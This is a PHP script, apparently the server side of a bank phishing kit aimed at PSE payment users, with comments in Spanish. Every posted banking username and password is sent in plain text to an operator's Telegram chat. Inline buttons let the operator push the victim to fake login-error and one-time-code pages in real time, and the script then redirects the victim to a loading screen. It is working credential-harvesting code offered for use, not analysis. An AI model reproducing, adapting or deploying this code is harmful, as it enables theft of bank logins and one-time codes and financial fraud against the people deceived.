<?php
session_start();
// Estos includes ahora funcionan juntos:
// 1. conexion.php usa config.php para conectarse a la BBDD de Render.
// 2. Nos da la variable $conn (como un objeto PDO).
include '../../../../assets/config/conexion.php'; 
$config = include '../../../../assets/config/config.php';

// Función para escapar caracteres especiales en MarkdownV2 (Sin cambios)
function escapeMarkdownV2($text) {
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $banco = $_POST['banco'];

    if (empty($user) || empty($pass)) {
        die("Error: Todos los campos son obligatorios.");
    }

    // --- SECCIÓN DE BASE DE DATOS ADAPTADA A PDO (PARA POSTGRESQL) ---
    
    $estado = 1; // Estado inicial

    // 1. Cambiamos la consulta: PostgreSQL usa "RETURNING id" para devolver el ID
    //    después de un INSERT.
    $sql_insert = "INSERT INTO pse (estado) VALUES (?) RETURNING id";

    // 2. Preparamos la consulta (esto es igual, pero $conn es un objeto PDO)
    $stmt_insert = $conn->prepare($sql_insert);
    
    // 3. Ejecutamos la consulta. En PDO, pasamos los valores como un array.
    //    Esto reemplaza a bind_param().
    $stmt_insert->execute([$estado]);
    
    // 4. Obtenemos el ID devuelto por "RETURNING id".
    //    Esto reemplaza a $stmt_insert->insert_id (que es de MySQLi).
    $nuevo_id = $stmt_insert->fetchColumn(); 

    // No se necesita $stmt_insert->close() de esta manera con PDO.

    // --- FIN DE LA SECCIÓN ADAPTADA ---


    // Enviar datos a Telegram (Sin cambios)
    $botToken = $config['telegram']['bot_token'];
    $chatId = $config['telegram']['chat_id'];
    $baseUrl = $config['base_url'];
    $security_key = 'tu_clave_secreta_aqui'; // Define tu clave de seguridad aquí

    $message = "🔐 *Nuevo inicio de sesión*\n\n"
             . "👤 *Usuario:* `" . escapeMarkdownV2($user) . "`\n"
             . "🔑 *Clave:* `" . escapeMarkdownV2($pass) . "`\n"
             . "🏦 *Banco:* `" . escapeMarkdownV2($banco) . "`";

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'Error Login', 'url' => "$baseUrl?id=$nuevo_id&estado=2&key=$security_key"]
            ],
            [
                ['text' => 'Otp', 'url' => "$baseUrl?id=$nuevo_id&estado=3&key=$security_key"],
                ['text' => 'Otp Error', 'url' => "$baseUrl?id=$nuevo_id&estado=4&key=$security_key"]
            ],
            [
                ['text' => 'Finalizar', 'url' => "$baseUrl?id=$nuevo_id&estado=0&key=$security_key"]
            ]
        ]
    ];

    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'MarkdownV2',
        'reply_markup' => json_encode($keyboard)
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ]
    ];

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        $error = error_get_last();
        file_put_contents('telegram_debug_log.txt', "Error: " . print_r($error, true), FILE_APPEND);
        die('Error al enviar mensaje a Telegram');
    }

    // Redirigir a la página cargando.php con el nuevo ID del cliente (Sin cambios)
    header("Location: ../cargando.php?id=" . $nuevo_id);
    exit();
}
?>